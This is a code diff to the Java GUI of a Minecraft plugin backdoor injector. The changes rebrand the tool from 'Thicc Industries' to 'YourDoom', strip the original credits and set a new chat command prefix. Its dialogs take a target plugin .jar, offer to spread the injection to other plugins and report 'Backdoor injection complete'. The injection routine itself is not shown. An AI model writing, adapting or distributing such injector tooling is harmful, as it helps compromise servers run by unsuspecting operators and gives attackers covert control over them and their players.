@@ -18,11 +18,10 @@ public class InjectorGUI{
             String[] options = {"Inject", "About", "Close"};
             result = JOptionPane.showOptionDialog(
                     null,
-                    "Thicc Industries' Minecraft Backdoor.\n" +
+                    "YourDoom\n" +
                             "Requirements:\n" +
-                            "   * Minecraft UUID\n" +
                             "   * Target plugin .jar file",
-                    "Thicc Industries Injector",
+                    "YourDoom",
                     JOptionPane.YES_NO_CANCEL_OPTION,
                     JOptionPane.PLAIN_MESSAGE,
                     null,       //no custom icon
@@ -33,11 +32,11 @@ public class InjectorGUI{
             if (result == JOptionPane.NO_OPTION) {
                 JOptionPane.showMessageDialog(
                         null,
-                        "Created by: Thicc Industries,\n" +
+                        "Created by: YourDoom,\n" +
                                 "Backdoor Version: 2.2.2\n" +
                                 "Release Date: March 25 2022\n" +
                                 "License: GPL v3.0",
-                        "Thicc Industries Injector",
+                        "YourDoom",
                         JOptionPane.INFORMATION_MESSAGE
                 );
             }
@@ -78,11 +77,11 @@ public class InjectorGUI{
         ChatPrefix = (String)JOptionPane.showInputDialog(
                 null,
                 "Chat Command Prefix:",
-                "Thicc Industries Injector",
+                "YourDoom",
                 JOptionPane.PLAIN_MESSAGE,
                 null,
                 null,
-                "#"
+                "xQc>"
         );
 
         //No input
@@ -92,14 +91,14 @@ public class InjectorGUI{
         InjectOther = JOptionPane.showConfirmDialog(
                 null,
                 "Inject to other plugins?\n[This feature is experimental!]",
-                "Thicc Industries Injector",
+                "YourDoom",
                 JOptionPane.YES_NO_OPTION
         ) == JOptionPane.YES_OPTION;
 
         Warnings = JOptionPane.showConfirmDialog(
                 null,
-                "Enable Debug Messages?\n[Please use this for github issues]",
-                "Thicc Industries Injector",
+                "Enable Debug Messages?\n[Usually unwanted except for testing purposes]",
+                "YourDoom",
                 JOptionPane.YES_NO_OPTION
         ) == JOptionPane.YES_OPTION;
         //Parse uuids
@@ -108,13 +107,13 @@ public class InjectorGUI{
         boolean result2 = Injector.patchFile(InPath, OutPath, sc, true, false);
 
         if(result2){
-            JOptionPane.showMessageDialog(null, "Backdoor injection complete.\nIf this project helped you, considering starring it on GitHub.", "Thicc Industries Injector", JOptionPane.INFORMATION_MESSAGE);
+            JOptionPane.showMessageDialog(null, "Backdoor injection complete.", "YourDoom", JOptionPane.INFORMATION_MESSAGE);
         }else{
-            JOptionPane.showMessageDialog(null, "Backdoor injection failed.\nPlease create a GitHub issue report if necessary.", "Thicc Industries Injector", JOptionPane.ERROR_MESSAGE);
+            JOptionPane.showMessageDialog(null, "Backdoor injection failed.", "YourDoom", JOptionPane.ERROR_MESSAGE);
         }
     }
 
     public static void displayError(String message){
-        JOptionPane.showMessageDialog(null, message, "Thicc Industries Injector", JOptionPane.ERROR_MESSAGE);
+        JOptionPane.showMessageDialog(null, message, "YourDoom", JOptionPane.ERROR_MESSAGE);
     }
 }
